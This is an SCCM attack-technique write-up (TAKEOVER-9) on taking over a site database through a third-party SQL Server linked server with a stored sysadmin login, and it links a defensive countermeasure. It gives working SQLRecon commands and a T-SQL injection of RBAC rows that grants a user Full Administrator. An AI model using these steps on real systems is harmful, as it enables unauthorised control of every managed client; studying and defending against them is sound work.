# TAKEOVER-9

## Description
Site database takeover via SQL Server linked-server abuse from a third-party system

## MITRE ATT&CK TTPs
- [TA0008](https://attack.mitre.org/tactics/TA0008) - Lateral Movement
- [TA0004](https://attack.mitre.org/tactics/TA0004) - Privilege Escalation

## Requirements
- A third-party SQL Server instance (a non-SCCM system) has a linked server configured that points at an SCCM site database.
- The linked server is configured with a **stored remote credential** (fixed login, not `uses_self_credential`) that is a member of the `sysadmin` server role on the target site database.
- The stored remote credential authenticates successfully against the site database. In practice this requires one of:
    - the site database accepts SQL Server authentication (mixed-mode: `LoginMode` = 2 under `HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\MSSQL16.MSSQLSERVER\MSSQLServer`) and the linked server stores a **SQL login** with `sysadmin`, or
    - the linked server is configured with a **Windows account** granted `sysadmin` on the site database and Kerberos delegation from the third-party SQL host to the site database host is functional (a less common configuration in practice).
- Attacker foothold on the third-party SQL Server sufficient to execute queries against a linked server:
    - a valid login on the third-party SQL (any privilege level; permission to invoke linked-server queries via the `public` role is typical), or
    - command execution on the third-party host (LOCAL SYSTEM / SQL service account context is sufficient), or
    - NTLM coercion + relay to the third-party SQL leading to either of the above.
- Target site database settings:
    - The linked-server remote credential is a member of the `sysadmin` fixed server role on the site database [DEFAULT if the third-party integration was configured with a DBA-privileged account].
    - Site database `RestrictReceivingNTLMTraffic` = `0` or not present [DEFAULT] (only relevant if the third-party SQL initiates the outbound connection via NTLM; a stored SQL login bypasses this).

## Summary
SCCM's own hierarchy replication uses SQL Server Service Broker and a linked server between the CAS and each primary site database that is configured with pass-through Windows authentication (`uses_self_credential = 1`). Those SCCM-managed links do not by themselves expose the site database to takeover.

The vulnerable pattern occurs when a **third-party product** (backup/recovery software, endpoint monitoring, asset/inventory management, custom reporting or data-warehouse ETL, and similar) is granted read access to the SCCM site database by way of a **linked server on the third-party SQL instance** that stores a **fixed remote credential** with `sysadmin` on the site database. Administrators typically configure this pattern for convenience — a single privileged login allows the third-party product to query any SCCM data it needs without permission tuning. Once created, the linked server persists indefinitely, is invisible from the site database side (linked-server definitions are stored on the initiating instance's `sys.servers` / `sys.linked_logins`, not the target), and is rarely audited.

An attacker who obtains a foothold on the third-party SQL instance — or on a system whose credentials can query it — can enumerate the linked servers with a tool such as `SQLRecon`, identify the SA-privileged hop to the SCCM site database, and execute arbitrary Transact-SQL on the site database via `EXECUTE (...) AT [LinkedServerName]`. Because the remote credential is a member of `sysadmin`, the attacker gains full control over the site database and can grant themselves the SCCM "Full Administrator" role by writing directly to the `RBAC_Admins` and `RBAC_ExtendedPermissions` tables (identical post-exploitation to TAKEOVER-1 / TAKEOVER-2 / TAKEOVER-3 after site-database access is obtained).

The attack is difficult to detect from the SCCM operator's perspective:
- Linked-server definitions live on the initiating (third-party) side. Auditing `sys.servers` on the site database will not surface them.
- The credential presented to the site database at attack time is the legitimate stored login, so authentication logs on the site database look normal.
- Third-party SQL instances often fall outside the SCCM team's operational scope and are inspected less rigorously than SCCM's own site systems.

**Related observation:** SCCM's hierarchy replication itself creates a linked server between the CAS and each primary site database, but that link is configured with `uses_self_credential = 1` and is not attackable in the pattern above. In practice these SCCM-managed links are often registered against the legacy `SQLNCLI10` OLE DB provider, which is not installed on modern site-database hosts, so the link exists in `sys.servers` but silently fails to actually pass traffic. This is a red herring for defenders — enumerating SCCM's own links is not what surfaces the TAKEOVER-9 exposure; enumerating third-party SQL instances for links pointing inward is.

## Impact
The "Full Administrator" security role is granted all permissions in Configuration Manager for all scopes and all collections. An attacker with this privilege can execute arbitrary programs on any client device that is online as SYSTEM, the currently logged on user, or as a specific user when they next log on. They can also leverage tools such as CMPivot and Run Script to query or execute scripts on client devices in real-time using the AdminService or WMI on an SMS Provider.

Additionally, `sysadmin` on the site database enables direct database-tier operations (schema modification, data exfiltration of inventory / secret material stored in Configuration Manager, and `xp_cmdshell` execution as the SQL service account on the site-database host if `xp_cmdshell` is or can be enabled).

## Defensive IDs
- [PREVENT-19: Remove unnecessary links to site databases](../../../defense-techniques/PREVENT/PREVENT-19/prevent-19_description.md)

## Examples
The following example assumes the attacker can query a third-party SQL Server with a linked server named `SCCMSITEDB` pointing at `ps1-db.mayyhem.com`.

1. Enumerate linked servers with SQLRecon:

    ```
    SQLRecon.exe /a:WinToken /h:localhost /m:Links
    | Linked Server | product | provider   | data_source        | Local Login | Is Self Mapping | Remote Login |
    | SCCMSITEDB    |         | MSOLEDBSQL | ps1-db.mayyhem.com | N/A         | False           | sccm_link    |
    ```

2. Check the identity and privileges used across the hop:

    ```
    SQLRecon.exe /a:WinToken /h:localhost /m:Whoami /l:SCCMSITEDB
    [*] Logged in as sccm_link
    [*] Mapped to the user dbo
    | sysadmin | Yes |
    ```

3. On the third-party SQL Server, execute the RBAC-insert query on the linked instance. The `EXECUTE ... AT` form runs the query on the remote database in the linked login's session, which has `sysadmin`:

    ```sql
    EXEC ('
      USE CM_PS1;
      INSERT INTO RBAC_Admins
        (AdminSID, LogonName, IsGroup, IsDeleted, CreatedBy, CreatedDate, ModifiedBy, ModifiedDate, SourceSite)
        VALUES (/* target user's actual SID in binary form */,
                ''MAYYHEM\lowpriv'', 0, 0, '''', '''', '''', '''', ''PS1'');
      INSERT INTO RBAC_ExtendedPermissions
        (AdminID, RoleID, ScopeID, ScopeTypeID)
        VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = ''MAYYHEM\lowpriv''),
                ''SMS0001R'', ''SMS00ALL'', ''29'');
      INSERT INTO RBAC_ExtendedPermissions
        (AdminID, RoleID, ScopeID, ScopeTypeID)
        VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = ''MAYYHEM\lowpriv''),
                ''SMS0001R'', ''SMS00001'', ''1'');
      INSERT INTO RBAC_ExtendedPermissions
        (AdminID, RoleID, ScopeID, ScopeTypeID)
        VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = ''MAYYHEM\lowpriv''),
                ''SMS0001R'', ''SMS00004'', ''1'');
    ') AT [SCCMSITEDB];
    ```

    SQLRecon's query module can run the same statement:

    ```
    SQLRecon.exe /a:WinToken /h:localhost /m:Query /l:SCCMSITEDB /c:"USE CM_PS1; ..."
    ```

4. Confirm that `MAYYHEM\lowpriv` now holds the Full Administrator role in the SCCM console or via `AdminService`.

## References
- Sanjiv Kawa, [SQLRecon](https://github.com/skahwah/SQLRecon)
- Chris Thompson (Mayyhem), clarification of TAKEOVER-9 abuse scenario, SpecterOps SCCM community Slack, 2026-08-21
